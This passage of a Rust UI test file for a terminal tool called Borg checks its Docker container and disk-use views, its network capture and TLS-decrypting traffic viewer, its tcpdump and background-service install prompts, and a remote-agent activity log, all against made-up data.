    let theme = stage.state.appearance.choices().iter().position(|c| c.id == "neon").unwrap();
    stage.state.appearance.select(theme, stage.started, Duration::ZERO);
    let effects = borg_core::update(
        &mut stage.state,
        Msg::Key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::ALT)),
        stage.started,
    );
    assert!(
        effects.iter().any(|e| matches!(e, borg_core::Effect::DockerWatch(true))),
        "opening starts the stats stream"
    );
    let Some((id, DockerRequest::List)) = stage.state.docker.pending.clone() else {
        panic!("opening lists containers")
    };
    let containers = vec![
        container("a1", Some("shop"), "web", State::Running, "Up 3 hours (healthy)"),
        container("a2", Some("shop"), "db", State::Running, "Up 3 hours (healthy)"),
        container("a3", Some("shop"), "worker", State::Exited, "Exited (1) 12 minutes ago"),
        container("b1", Some("blog"), "app", State::Paused, "Up 2 days (Paused)"),
        container("c1", None, "scratch", State::Exited, "Exited (0) 2 days ago"),
    ];
    let ids: Vec<String> = containers.iter().map(|c| c.id.clone()).collect();
    stage
        .send(Msg::Docker { id, result: Ok(DockerData::Listed { context: Some("desktop-linux".into()), containers }) });
    let seconds = 40u64;
    for second in 0..seconds {
        let wave = (second as f64 / 4.0).sin().abs();
        let frame = vec![
            (
                ids[0].clone(),
                Stats {
                    cpu: 400 + (wave * 2600.0) as u32,
                    memory: 180_000_000 + second * 900_000,
                    memory_limit: 8_000_000_000,
                    net_rx: 52_000_000,
                    net_tx: 9_400_000,
                    read: 12_000_000,
                    written: 3_000_000,
                    pids: 9,
                },
            ),
            (
                ids[1].clone(),
                Stats { cpu: 120, memory: 420_000_000, memory_limit: 8_000_000_000, pids: 31, ..Stats::default() },
            ),
            (ids[3].clone(), Stats { memory: 64_000_000, ..Stats::default() }),
        ];
        let at = stage.started - Duration::from_secs(seconds - 1 - second);
        borg_core::update(&mut stage.state, Msg::DockerStats(frame), at);
    }
    for _ in 0..4 {
        stage.send(key(KeyCode::Down));
    }
    assert_eq!(stage.state.docker.container().map(|c| c.label()), Some("web"), "projects sort by name, services too");
    let later = stage.started + Duration::from_secs(1);
    borg_core::update(&mut stage.state, Msg::Tick, later);
    let Some((id, DockerRequest::Inspect(inspected))) = stage.state.docker.pending.clone() else {
        panic!("resting on a container inspects it")
    };
    assert_eq!(inspected, ids[0]);
    let details = Details {
        started: Some("2026-10-22T09:12:44Z".into()),
        finished: None,
        exit_code: 0,
        oom_killed: false,
        error: String::new(),
        health: Some("healthy".into()),
        restarts: 0,
        restart_policy: "unless-stopped".into(),
        command: "nginx -g 'daemon off;'".into(),
        workdir: String::new(),
        platform: "linux".into(),
        mounts: vec![Mount {
            kind: "volume".into(),
            source: "shop_static".into(),
            destination: "/usr/share/nginx/html".into(),
            writable: false,
        }],
        networks: vec![Network { name: "shop_default".into(), address: "172.18.0.4".into() }],
    };
    stage.send(Msg::Docker { id, result: Ok(DockerData::Inspected { id: inspected, details: Box::new(details) }) });
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "shop › web")?;
    ensure_text(&buffer, "shop_static → /usr/share/nginx/html (ro)")?;
    check("docker_container", &stage, buffer)?;

    let menu = borg_core::menus(&stage.state).iter().position(|m| m.title == "Docker").expect("a Docker menu");
    stage.send(Msg::Pointer(borg_core::Pointer::Menu(menu)));
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "Restart…")?;
    check("docker_menu", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));
    assert!(stage.state.docker.is_open(), "Esc closes the menu, not the view");

    stage.send(key(KeyCode::Up)).send(key(KeyCode::Up));
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "2 of 3 running")?;
    ensure_text(&buffer, "Now %  Avg %")?;
    check("docker_project", &stage, buffer)?;

    resize(&mut stage, DOCKER_NARROW);
    let buffer = stage.render(later)?;
    anyhow::ensure!(!describe(&buffer).contains("Now %"), "a narrow list shows the average alone");
    check("docker_project_narrow", &stage, buffer)?;
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "CPU avg")?;
    check("docker_container_narrow", &stage, buffer)?;
    stage.send(key(KeyCode::Up)).send(key(KeyCode::Up));
    resize(&mut stage, DOCKER_WIDE);

    stage.send(key(KeyCode::Char('x')));
    let Some(borg_core::Overlay::Confirm(confirm)) = stage.state.overlay.clone() else { panic!("stopping asks first") };
    assert_eq!(confirm.message, "Stop 2 containers in shop?");
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), later);
    let request = effects.iter().find_map(|e| match e {
        borg_core::Effect::Docker { request: DockerRequest::Act { action, ids }, .. } => Some((*action, ids.len())),
        _ => None,
    });
    assert_eq!(request, Some((borg_docker::Action::Stop, 2)), "only running containers are stopped");
    let buffer = stage.render(later)?;
    ensure_text(&buffer, "Stopping…")?;

    stage.send(key(KeyCode::Esc));
    assert!(!stage.state.docker.is_open(), "Esc closes the view");
    Ok(())
}

/// What the made-up shop engine keeps on disk: two builds of the web image, the worker's old
/// image, a dangling build, a digest pull, containers that stopped, and volumes of every kind.
fn disk_use() -> borg_docker::DiskUse {
    use borg_docker::{CacheRecord, DiskUse, Image, Layer, State, Volume};
    const MB: u64 = 1_000_000;
    let time = |stamp: &str| stamp.parse::<jiff::Timestamp>().ok();
    let image = |id: &str, tags: &[&str], repository: Option<&str>, size: u64, unique: u64, containers: u32| Image {
        id: format!("sha256:{id}{}", "0".repeat(52)),
        tags: tags.iter().map(|tag| (*tag).to_owned()).collect(),
        repository: repository.map(str::to_owned),
        size: Some(size),
        shared: Some(size - unique),
        unique: Some(unique),
        created: time("2026-01-08T16:20:00Z"),
        containers: Some(containers),
    };
    let layer = |name: &str, state: State, status: &str, size: u64| Layer {
        id: format!("{}{}", &name[..4], "0".repeat(60)),
        name: name.into(),
        image: "shop-web:1.4".into(),
        state,
        status: status.into(),
        size: Some(size),
    };
    let volume = |name: &str, size: u64, users: &[&str], anonymous: bool| Volume {
        name: name.into(),
        size: Some(size),
        links: Some(users.len() as u32),
        anonymous,
        users: users.iter().map(|user| (*user).to_owned()).collect(),
    };
    let record = |id: &str, kind: &str, size: u64, shared: bool, in_use: bool, description: &str| CacheRecord {
        id: format!("{id}{}", "x".repeat(20)),
        kind: kind.into(),
        size: Some(size),
        shared,
        in_use,
        last_used: time("2026-01-14T18:05:00Z"),
        description: description.into(),
    };
    DiskUse {
        images: vec![
            image("a1b2c3d4e5f6", &["shop-web:1.4", "shop-web:latest"], Some("shop-web"), 248 * MB, 31 * MB, 1),
            image("b2c3d4e5f6a7", &["postgres:16"], Some("postgres"), 438 * MB, 438 * MB, 1),
            image("c3d4e5f6a7b8", &["shop-worker:1.3"], Some("shop-worker"), 236 * MB, 160 * MB, 0),
            image("d4e5f6a7b8c9", &[], None, 247 * MB, 29 * MB, 0),
            image("e5f6a7b8c9d0", &[], Some("mirror.example/tools/jq"), 3 * MB, 3 * MB, 0),
        ],
        containers: vec![
            layer("shop-web-1", State::Running, "Up 3 hours", 2 * MB),
            layer("shop-db-1", State::Running, "Up 3 hours", 63),
            layer("shop-worker-1", State::Exited, "Exited (1) 12 minutes ago", 48 * MB),
            layer("shop-migrate-1", State::Created, "Created", 0),
        ],
        volumes: vec![
            volume("shop_data", 312 * MB, &["shop-db-1"], false),
            volume("blog_uploads", 860 * MB, &[], false),
            volume("3b9d5e7f1a2c4b6d8e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d", 512 * MB, &[], true),
        ],
        cache: vec![
            record("r1", "regular", 412 * MB, false, false, "[build 3/5] RUN npm ci"),
            record("r2", "regular", 75 * MB, true, false, "[build 1/5] FROM node:22"),
            record("r3", "exec.cachemount", 296 * MB, false, false, "--mount=type=cache,target=/root/.npm"),
            record("r4", "source.local", MB, false, true, "local source for context"),
        ],
        networks: vec!["blog_default".into()],
    }
}

/// Docker's disk use beside the containers: a row per kind with its reclaimable total, a kind
/// unfolded into its items with two marked, and the console with the command F8 typed.
#[test]
fn docker_disk_use_lists_kinds_and_types_cleanup_at_the_prompt() -> Result<()> {
    use borg_core::{DockerData, DockerRequest, Effect, View};
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::ALT)));
    let Some((id, DockerRequest::List)) = stage.state.docker.pending.clone() else {
        panic!("opening lists containers")
    };
    let listed = DockerData::Listed { context: Some("desktop-linux".into()), containers: Vec::new() };
    stage.send(Msg::Docker { id, result: Ok(listed) });
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Char('d')), stage.started);
    let id = effects
        .iter()
        .find_map(|e| match e {
            Effect::Docker { id, request: DockerRequest::DiskUse } => Some(*id),
            _ => None,
        })
        .context("D measures disk use")?;
    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
    ensure_text(&buffer, "Measuring disk use…")?;
    let measured = DockerData::DiskUse {
        usage: Box::new(disk_use()),
        context: Some("desktop-linux".into()),
        contexts: Some(vec!["default".into(), "desktop-linux".into()]),
    };
    stage.send(Msg::Docker { id, result: Ok(measured) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Disk use · desktop-linux")?;
    ensure_text(&buffer, "docker --context desktop-linux builder prune")?;
    check("docker_disk", &stage, buffer)?;

    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Right)).send(key(KeyCode::Down));
    stage.send(key(KeyCode::Char(' '))).send(key(KeyCode::Char(' '))).send(key(KeyCode::Up));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "2 marked")?;
    check("docker_disk_expanded", &stage, buffer)?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::F(8)), stage.started);
    let typed: Vec<u8> = effects
        .iter()
        .filter_map(|e| match e {
            Effect::Write(bytes) => Some(bytes.clone()),
            _ => None,
        })
        .flatten()
        .collect();
    assert_eq!(typed, b"docker --context desktop-linux rmi shop-worker:1.3 e5f6a7b8c9d0", "no Enter");
    assert_eq!(stage.state.view, View::Shell);
    stage.shell(&typed);
    let buffer = stage.render(stage.started)?;
    check("docker_disk_typed", &stage, buffer)
}

/// The network screen over a made-up machine after half a minute of samples: the ports and
/// who can reach them, the processes, the connections with their host names and traffic, and
/// the interfaces.
#[test]
fn network_lists_ports_processes_connections_and_interfaces() -> Result<()> {
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "1 Ports")?;
    ensure_text(&buffer, "sshd · PID 301")?;
    check("network_ports", &stage, buffer)?;

    stage.send(key(KeyCode::Char('2')));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "browser · PID 8239")?;
    check("network_processes", &stage, buffer)?;

    stage.send(key(KeyCode::Char('3')));
    assert_eq!(stage.state.network.connection().and_then(|(socket, _)| socket.pid), Some(8239), "the busiest leads");
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "cdn.example.net:443")?;
    check("network_connections", &stage, buffer)?;

    stage.send(key(KeyCode::Char('4')));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "192.0.2.20/24")?;
    check("network_interfaces", &stage, buffer)?;

    stage.send(key(KeyCode::Char('1'))).send(key(KeyCode::Char('/'))).send(Msg::Paste("port:ssh".into()));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "port:ssh")?;
    assert_eq!(stage.state.network.ports.len(), 1, "the filter keeps the SSH port");
    check("network_filter", &stage, buffer)?;

    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
    assert!(!stage.state.network.is_open(), "Esc clears the filter, then closes the screen");
    Ok(())
}

/// R on the browser's row asks what to capture; the capture opens in the traffic viewer on
/// the browser, where Enter goes from the process to its connections, whose bytes ] steps
/// through by turn and F3 shows as hex rows, and on to one connection's packets, and Esc comes
/// back the same way to every process and the hosts.
#[test]
fn network_captures_traffic_and_shows_it_by_process_host_connection_and_packet() -> Result<()> {
    use borg_core::{Capture, Effect, TrafficPage};
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    stage.send(key(KeyCode::Char('2'))).send(key(KeyCode::Char('r')));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "All traffic, shown for browser · PID 8239")?;
    check("network_capture_dialog", &stage, buffer)?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
    assert_eq!((request.interface.as_str(), request.filter.as_str()), ("en0", ""), "all of the busiest interface");
    stage.send(Msg::CaptureProgress { id, progress: CaptureProgress { bytes: 52_400, packets: 61, room: None } });
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "Capturing on en0 · 61 packets")?;
    ensure_text(&buffer, "R Stop capture")?;

    let capture = Capture::read(&borg_testkit::capture::bytes()).map_err(|error| anyhow::anyhow!(error.describe()))?;
    let path = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.pcap");
    stage.send(Msg::CaptureDone { id, result: Ok((path, capture)) });
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "pid:8239")?;
    ensure_text(&buffer, "cdn.example.net:443")?;
    check("traffic_processes", &stage, buffer)?;

    stage.send(key(KeyCode::Enter));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "Stream · ")?;
    ensure_text(&buffer, "→ Sent ")?;
    check("traffic_connections", &stage, buffer)?;

    stage.send(key(KeyCode::Tab)).send(key(KeyCode::Char(']')));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "← Received ")?;
    ensure_text(&buffer, "[ ] Turn")?;
    check("traffic_stream_turn", &stage, buffer)?;

    stage.send(key(KeyCode::F(3)));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "h text")?;
    check("traffic_stream_viewer", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));
    assert!(stage.state.viewer.is_none(), "Esc goes back to the stream");

    stage
        .send(key(KeyCode::Tab))
        .send(key(KeyCode::Enter))
        .send(key(KeyCode::Down))
        .send(key(KeyCode::Down))
        .send(key(KeyCode::Down));
    stage.send(key(KeyCode::Tab));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "ClientHello · cdn.example.net")?;
    check("traffic_packet", &stage, buffer)?;

    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
    let view = stage.state.network.viewer.as_deref().context("the viewer stays open")?;
    assert_eq!((view.page, view.filter.as_str()), (TrafficPage::Processes, "pid:8239"), "back to the browser");
    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Char('2')));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "api.example.com")?;
    check("traffic_hosts", &stage, buffer)?;

    stage.send(key(KeyCode::Esc));
    assert!(stage.state.network.viewer.is_none() && stage.state.network.is_open(), "Esc goes back to the live screen");
    Ok(())
}

/// A capture that holds the TLS keys of its connections opens decrypted: the connection's
/// stream shows the request and the answer the records carried, and marks the record no key
/// opens.
#[test]
fn traffic_shows_a_tls_connection_decrypted_with_its_keys() -> Result<()> {
    use borg_core::Capture;
    let mut stage = stage(GridSize { cols: 132, rows: 58 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    let capture =
        Capture::read(&borg_testkit::capture::decryptable()).map_err(|error| anyhow::anyhow!(error.describe()))?;
    let path = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.pcapng");
    stage.send(Msg::CaptureOpened { path, result: Ok(capture) }).send(key(KeyCode::Char('3')));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, " · decrypted")?;
    ensure_text(&buffer, "GET /api")?;
    ensure_text(&buffer, "HTTP/1.1")?;
    ensure_text(&buffer, " · still encrypted")?;
    check("traffic_decrypted_stream", &stage, buffer)
}

/// Where Borg can ask the system for an administrator, the capture dialog offers **Run as**. A
/// capture refused as the user asks to run as administrator; yes waits for the system's
/// password dialog, and the pcapng it saves names each packet's process, even a process that
/// ended before the screen saw it.
#[test]
fn network_captures_as_administrator_and_names_every_packets_process() -> Result<()> {
    use borg_core::{Capture, CaptureAccess, CaptureFailure, Effect, Overlay};
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    stage.state.network.access = CaptureAccess { administrator: false, elevate: true, tags: true };
    stage.send(key(KeyCode::Char('2'))).send(key(KeyCode::Char('r'))).send(key(KeyCode::End));
    stage.send(key(KeyCode::Right));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "Administrator, with each packet's process")?;
    ensure_text(&buffer, "Saved as a .pcapng file")?;
    check("network_capture_dialog_run_as", &stage, buffer)?;

    stage.send(key(KeyCode::Left));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
    assert!(!request.administrator, "the first capture runs as the user");
    stage.send(Msg::CaptureDone { id, result: Err(CaptureFailure::Denied) });
    let Some(Overlay::Confirm(_)) = &stage.state.overlay else { panic!("a refusal asks to run as administrator") };
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "Capture as administrator")?;
    check("network_capture_admin_question", &stage, buffer)?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("yes captures again") };
    assert!(request.administrator && request.processes, "as administrator, with each packet's process");
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "Waiting for your password to capture on en0")?;
    check("network_capture_waiting", &stage, buffer)?;

    let capture = Capture::read(&borg_testkit::capture::tagged()).map_err(|error| anyhow::anyhow!(error.describe()))?;
    let path = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.pcapng");
    stage.send(Msg::CaptureDone { id, result: Ok((path, capture)) });
    stage.send(key(KeyCode::Esc)).send(key(KeyCode::End));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, &format!("updater · PID {}", borg_testkit::capture::UPDATER))?;
    check("traffic_tagged_processes", &stage, buffer)?;
    Ok(())
}

/// A capture that keeps TLS keys sets `SSLKEYLOGFILE` at Borg's shell prompt, says so while it
/// records, and offers the line for programs started in another terminal.
#[test]
fn network_records_tls_keys_through_borgs_shell() -> Result<()> {
    use borg_core::{CaptureField, Effect, Overlay, TlsKeys, View};
    use borg_term::ShellSignal;
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    stage.state.shell.integrated = true;
    stage.send(key(KeyCode::Char('2'))).send(key(KeyCode::Char('r')));
    while !matches!(&stage.state.overlay, Some(Overlay::Capture(dialog)) if dialog.selected() == CaptureField::TlsKeys)
    {
        stage.send(key(KeyCode::Down));
    }
    stage.send(key(KeyCode::Right));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "TLS keys   ‹ Set SSLKEYLOGFILE in Borg's shell ›")?;
    check("network_capture_dialog_tls_keys", &stage, buffer)?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
    assert_eq!(request.tls_keys, TlsKeys::Shell);
    let key_log = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.keylog");
    let effects = borg_core::update(&mut stage.state, Msg::CaptureKeys { id, path: key_log, proxy: None }, now);
    let export = b"export SSLKEYLOGFILE='/home/me/projects/borg/capture-20260101-120000.keylog'\r".to_vec();
    assert!(effects.contains(&Effect::Write(export)), "the line is typed at the prompt: {effects:?}");
    assert_eq!(stage.state.view, View::Shell, "where it shows");
    stage.send(Msg::Signal(ShellSignal::CommandEnd { exit: Some(0) }));
    stage.send(Msg::CaptureProgress { id, progress: CaptureProgress { bytes: 52_400, packets: 61, room: None } });
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "61 packets · 51K · 5 s left · TLS keys")?;
    ensure_text(&buffer, "L Copy SSLKEYLOGFILE")?;
    check("network_capture_tls_keys", &stage, buffer)?;
    Ok(())
}

/// A capture through Borg's proxy names the CA that signs for it in the dialog, points HTTPS at
/// the proxy in Borg's shell, and says where the proxy listens while it records.
#[test]
fn network_records_https_through_borgs_proxy() -> Result<()> {
    use borg_core::{Authority, CaptureField, Effect, Overlay, ProxyEndpoint, TlsKeys};
    use borg_term::ShellSignal;
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    stage.state.shell.integrated = true;
    let folder = PathBuf::from("/home/me/.local/share/mkcert");
    stage.state.network.authority = Authority::Folder(folder.clone());
    stage.send(key(KeyCode::Char('2'))).send(key(KeyCode::Char('r')));
    while !matches!(&stage.state.overlay, Some(Overlay::Capture(dialog)) if dialog.selected() == CaptureField::TlsKeys)
    {
        stage.send(key(KeyCode::Down));
    }
    stage.send(key(KeyCode::Right)).send(key(KeyCode::Right));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "‹ Proxy HTTPS through Borg with the CA in /home/me/.local/share/mkcert ›")?;
    check("network_capture_dialog_proxy", &stage, buffer)?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
    assert_eq!(request.tls_keys, TlsKeys::Proxy(Authority::Folder(folder)));
    let key_log = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.keylog");
    let proxy = ProxyEndpoint {
        address: "127.0.0.1:54321".parse()?,
        trust: PathBuf::from("/run/user/1000/borg/trust-4242-1.pem"),
    };
    let effects = borg_core::update(&mut stage.state, Msg::CaptureKeys { id, path: key_log, proxy: Some(proxy) }, now);
    let typed = |effect: &Effect| matches!(effect, Effect::Write(line) if line.starts_with(b"export HTTPS_PROXY='http://127.0.0.1:54321' "));
    assert!(effects.iter().any(typed), "the line is typed at the prompt: {effects:?}");
    stage.send(Msg::Signal(ShellSignal::CommandEnd { exit: Some(0) }));
    stage.send(Msg::CaptureProgress { id, progress: CaptureProgress { bytes: 52_400, packets: 61, room: None } });
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "61 packets · 51K · 5 s left · Proxy on 127.0.0.1:54321")?;
    ensure_text(&buffer, "L Copy proxy settings")?;
    check("network_capture_proxy", &stage, buffer)?;
    Ok(())
}

/// A capture that runs until it is stopped says in the footer when a limit stops it at its
/// rate so far, and the stream of a connection it kept only the start of says how much it left
/// out.
#[test]
fn network_capture_tells_when_a_limit_stops_it_and_what_it_left_out() -> Result<()> {
    use borg_core::{Capture, ConnectionBudget, Effect};
    const MIB: u64 = 1024 * 1024;
    const KEPT: u64 = 200;
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    stage.send(key(KeyCode::Char('r'))).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Left));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let Some(Effect::Capture { id, request }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
    assert_eq!((request.seconds, request.keep), (None, Keep::ConnectionStart));
    let progress = CaptureProgress { bytes: 64 * MIB, packets: 40_000, room: Some(8 * 1024 * MIB) };
    stage.send(Msg::CaptureProgress { id, progress });
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
    let buffer = stage.render(now + Duration::from_secs(10))?;
    ensure_text(&buffer, "40000 packets · 64M · about 30 s to 256 MiB")?;
    check("network_capture_limit_ahead", &stage, buffer)?;

    let mut budget = ConnectionBudget::new(KEPT);
    let trimmed = [budget.feed(&borg_testkit::capture::bytes()), budget.rest()].concat();
    let capture = Capture::read(&trimmed).map_err(|error| anyhow::anyhow!(error.describe()))?;
    let path = PathBuf::from("/home/me/projects/borg/capture-20260101-120000.pcap");
    stage.send(Msg::CaptureDone { id, result: Ok((path, capture)) }).send(key(KeyCode::Char('3')));
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, " left out")?;
    check("traffic_stream_left_out", &stage, buffer)
}

/// A capture without tcpdump offers to install it with the package manager Borg found, and
/// Enter types the command into the shell.
#[test]
fn network_offers_to_install_a_missing_tcpdump() -> Result<()> {
    use borg_core::{CaptureFailure, Effect, Elevation, Installer, PackageManager, View};
    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
    let now = borg_testkit::network::open(&mut stage)?;
    stage.send(key(KeyCode::Char('r')));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let Some(Effect::Capture { id, .. }) = effects.into_iter().next() else { panic!("Enter starts the capture") };
    let installer = Installer { manager: PackageManager::Apt, elevation: Some(Elevation::Sudo) };
    stage.send(Msg::CaptureDone { id, result: Err(CaptureFailure::Missing(Some(installer))) });
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "sudo apt-get install tcpdump")?;
    check("network_install_tcpdump", &stage, buffer)?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    assert!(effects.contains(&Effect::Write(b"sudo apt-get install tcpdump\r".to_vec())), "Enter types the command");
    assert_eq!(stage.state.view, View::Shell, "and shows the shell");
    Ok(())
}

/// Remote → Background service… asks the app how the service stands. A missing one gets the
/// dialog with the command that installs, enables and starts it, a row for each part, and Enter
/// types it into the shell.
#[test]
fn remote_menu_offers_to_install_the_background_service() -> Result<()> {
    use borg_core::{Action, Effect, MenuCursor, Overlay, Pointer, ServiceCheck, ServiceStatus, View};
    let mut stage = stage(GridSize { cols: 100, rows: 28 }, Motion::STILL)?;
    let now = stage.started;
    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Remote").unwrap();
    stage.send(Msg::Pointer(Pointer::Menu(index)));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "Background service…")?;
    check("remote_menu", &stage, buffer)?;

    stage.send(key(KeyCode::Up));
    let Some(Overlay::Menu(MenuCursor { item: Some(item), .. })) = stage.state.overlay else {
        panic!("the menu is open")
    };
    let chosen = borg_core::menus(&stage.state)[index].item(item).map(|entry| entry.action);
    assert_eq!(chosen, Some(Action::BackgroundService), "Up wraps to the last entry");
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    assert!(effects.contains(&Effect::CheckService), "the app is asked: {effects:?}");
    let program = "/usr/local/bin/borg".to_owned();
    stage.send(Msg::Service(ServiceCheck { status: ServiceStatus::Missing, program, root: false }));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "/usr/local/bin/borg service enable &&")?;
    check("service_install", &stage, buffer)?;

    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), now);
    let typed = b"/usr/local/bin/borg service install && /usr/local/bin/borg service enable && \
/usr/local/bin/borg service start\r";
    assert!(effects.contains(&Effect::Write(typed.to_vec())), "Enter types the command: {effects:?}");
    assert_eq!(stage.state.view, View::Shell, "and shows the shell");
    Ok(())
}

/// Remote → Remote log… opens the log with no agent connected: what agents did before Borg
/// started again, each entry with its date.
#[test]
fn remote_log_shows_what_agents_did_before_borg_started_again() -> Result<()> {
    use borg_core::{Action, MenuCursor, Overlay, Pointer};
    let mut stage = stage(GridSize { cols: 100, rows: 28 }, Motion::STILL)?;
    let now = stage.started;
    stage.state.agent.restore_log(vec![
        "2026-11-08 23:10:04  an agent connected".into(),
        "2026-11-08 23:10:09  ran in ~/srv/shop\n$ make test\n[exit 0]".into(),
        "2026-11-08 23:12:41  declined editing ~/srv/shop/.env".into(),
        "2026-11-08 23:13:02  an agent disconnected".into(),
    ]);
    assert!(!stage.state.agent.connected());
    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Remote").unwrap();
    stage.send(Msg::Pointer(Pointer::Menu(index)));
    stage.send(key(KeyCode::Up));
    stage.send(key(KeyCode::Up));
    let Some(Overlay::Menu(MenuCursor { item: Some(item), .. })) = stage.state.overlay else {
        panic!("the menu is open")
    };
    let chosen = borg_core::menus(&stage.state)[index].item(item).map(|entry| entry.action);
    assert_eq!(chosen, Some(Action::AgentLog), "the entry above Background service…");
    stage.send(key(KeyCode::Enter));
    assert_eq!(stage.state.overlay, Some(Overlay::AgentLog { scroll: None }));
    let buffer = stage.render(now)?;
    ensure_text(&buffer, "2026-11-08 23:12:41  declined editing ~/srv/shop/.env")?;
    check("agent_log_restored", &stage, buffer)
}

/// Docker → Files: the list's panel shows the container's filesystem, named in its title,
/// beside the host folder in the other panel.
#[test]
fn docker_files_name_the_container_in_the_panel() -> Result<()> {
    use borg_core::{DockerData, DockerRequest};
    use borg_docker::State;
    let mut stage = stage(GridSize { cols: 110, rows: 24 }, Motion::STILL)?;
    // With the command line kept on the host, the prompt shows it is the host's.
    stage.state.settings.preferences.docker_console = false;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::ALT)));
    let Some((id, DockerRequest::List)) = stage.state.docker.pending.clone() else {
        panic!("opening lists containers")
    };
    let web = container("a1", Some("shop"), "web", State::Running, "Up 3 hours");
    stage.send(Msg::Docker { id, result: Ok(DockerData::Listed { context: None, containers: vec![web] }) });
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Down), stage.started);
    assert!(effects.iter().all(|e| !matches!(e, borg_core::Effect::List { .. })));
    let effects = borg_core::update(&mut stage.state, key(KeyCode::Char('f')), stage.started);
    let Some(borg_core::Effect::List { side, generation, dir }) = effects.into_iter().next() else {
        panic!("Files lists the container's root")
    };
    assert_eq!(dir, PathBuf::from("/"));
    let folder = |name: &str| Entry {
